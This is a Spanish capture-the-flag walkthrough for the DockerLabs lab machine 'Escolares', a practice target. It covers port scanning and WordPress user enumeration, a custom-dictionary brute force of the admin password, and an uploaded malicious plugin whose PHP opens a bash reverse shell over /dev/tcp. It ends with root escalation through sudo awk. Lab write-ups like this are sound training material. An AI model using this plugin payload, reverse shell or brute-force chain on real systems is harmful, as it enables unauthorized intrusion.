#MAQUINA #DOCKERLABS #FACIL 
#WPSCAN
<hr>

# RECONOCIMIENTO

Vamos a resolver **Escolares** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 12:43 CET
Initiating ARP Ping Scan at 12:43
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 12:43, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:43
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 12:43, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-11-26 12:43:12 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 12:44 CET
Nmap scan report for consolelog.lab (172.17.0.2)
Host is up (0.000018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 42:24:24:f5:66:68:a4:ad:8e:24:0d:70:4a:a5:e3:4f (ECDSA)
|_  256 29:42:2e:b6:85:ae:fb:09:89:8d:b9:c1:dc:4d:fc:1e (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: P\xC3\xA1gina Escolar Universitaria
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.47 seconds


```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 12:44 CET
Nmap scan report for consolelog.lab (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /wordpress/: Blog
|   /info.php: Possible information file
|   /phpmyadmin/: phpMyAdmin
|_  /wordpress/wp-login.php: Wordpress login page.
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.15 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** Posible **wordpress**.

## HTTP (80)

Al revisar la web que hay en el puerto 80 con **wpscan** vemos que es un wordpress :

   ```bash

wpscan --url "http://172.17.0.2/wordpress/" --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://172.17.0.2/wordpress/ [172.17.0.2]
[+] Started: Tue Nov 26 12:46:30 2024

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] luisillo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Nov 26 12:46:31 2024
[+] Requests Done: 50
[+] Cached Requests: 5
[+] Data Sent: 12.792 KB
[+] Data Received: 349.139 KB
[+] Memory used: 235.148 MB
[+] Elapsed time: 00:00:01


```

Podemos ver que nos da un usuario -> **luisillo** , vamos a ver si podemos sacar su contraseña 
# EXPLOTACION

Podemos ver que nos da un usuario -> **luisillo** , vamos a ver si podemos sacar su contraseña : 
+ Con el rockyou no obtenemos nada, vamos a hacer un diccionario personalizado con **cupp -i**.
+ En la sección profesores, el **admin wordpress es luisillo** y hay info acerca suyo.

   ```bash

wpscan --url "http://172.17.0.2/wordpress/" -U luisillo --passwords ./luis.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://172.17.0.2/wordpress/ [172.17.0.2]
[+] Started: Tue Nov 26 12:56:22 2024

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - luisillo / Luis1981                                                                                                                       
Trying luisillo / Luis1981 Time: 00:00:03 <===================                                                   > (1510 / 5294) 28.52%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: luisillo, Password: Luis1981

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Nov 26 12:56:28 2024
[+] Requests Done: 1650
[+] Cached Requests: 34
[+] Data Sent: 856.122 KB
[+] Data Received: 949.603 KB
[+] Memory used: 286.195 MB
[+] Elapsed time: 00:00:05

```

**usuario : luisillo**
**contraseña: Luis1981**

En ssh no valen esas credenciales, así que entramos al wordpress como admin.

Nos vamos a plugins y subimos y activamos un plugin. Vamos a subir un zip que nos otorgue una reverse shell y nos ponemos en escucha por el puerto 443 (**nc -nlvp 443**).
Contenido del zip, un php con:

   ```bash

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

```

# ESCALADA PRIVILEGIOS

Vemos que hay un secret.txt en /home :
   ```bash
www-data@a8b5aa2548c4:/home$ ls -la
total 28
drwxr-xr-x 1 root     root     4096 Jun  8 22:43 .
drwxr-xr-x 1 root     root     4096 Nov 26 01:43 ..
drwxr-x--- 1 luisillo luisillo 4096 Jun  8 22:42 luisillo
-rwxrwxrwx 1 root     root       23 Jun  8 22:43 secret.txt
drwxr-x--- 1 ubuntu   ubuntu   4096 Jun  8 22:59 ubuntu
www-data@a8b5aa2548c4:/home$ cat secret.txt 
luisillopasswordsecret
www-data@a8b5aa2548c4:/home$ su luisillo
Password: 
luisillo@a8b5aa2548c4:/home$ 
```

YA ESTAMOS COMO LUISILLO.

Vemos si el usuario tiene permisos SUDO:
   ```bash
luisillo@a8b5aa2548c4:/home$ sudo -l
Matching Defaults entries for luisillo on a8b5aa2548c4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on a8b5aa2548c4:
    (ALL) NOPASSWD: /usr/bin/awk


```

Vemos **awk** con permisos SUDO :
   ```bash
luisillo@a8b5aa2548c4:/home$ 

    sudo awk 'BEGIN {system("/bin/sh")}'

# whoami
root
# 

```

**YA ESTAMOS COMO ROOT.**